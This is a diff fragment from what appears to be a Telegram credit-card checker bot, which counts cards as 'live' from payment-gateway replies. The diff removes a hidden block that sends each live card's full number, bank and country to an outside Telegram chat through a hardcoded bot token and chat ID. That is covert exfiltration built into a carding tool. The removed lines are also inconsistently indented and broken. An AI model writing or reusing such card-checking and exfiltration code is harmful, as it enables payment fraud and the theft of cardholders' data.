@@ -442,24 +442,6 @@ def menu_callback(call):
 • 𝙱𝙾𝚃 𝙱𝚈 ➠ @Sidhu_Garry</b>'''
 					if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last:
 						live += 1
-						tok = '7255667594:AAGEBBQGFz3ZtEeAZg5WINitS4UPuVFTHWU'
-		acc =  '-1002215739885'
-		mg = f"""<b> 
-❆═══» 𝗚𝗔𝗥𝗥𝗬 𝗦𝗖𝗥𝗔𝗣𝗣𝗘𝗥 «═══❆
-𝗖𝗵𝗮𝗿𝗴𝗲𝗱 𝟬.𝟬𝟭$⚡️
-｢𝙲𝙲」➔ <code>{cc}</code>
-❆═══» 𝙸𝙽𝙵𝙾 «═══❆
-｢𝙱𝙸𝙽」➔ <code>{cc[:6]}</code>
-｢𝙸𝙽𝙵𝙾」➔ <code>{brand} - {card_type} - {level}</code>
-｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
-｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
-❆═══» 𝗚𝗔𝗥𝗥𝗬 𝗦𝗖𝗥𝗔𝗣𝗣𝗘𝗥 «═══❆
-✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @garryplays 
-✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @Sidhu_garry   
-</b>"""
-		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
-		tlg_params = {"parse_mode": "HTML"}
-						bot.send_message(call.from_user.id, msg)
 					elif 'risk' in last:
 						risk+=1
 					elif 'CVV' in last:
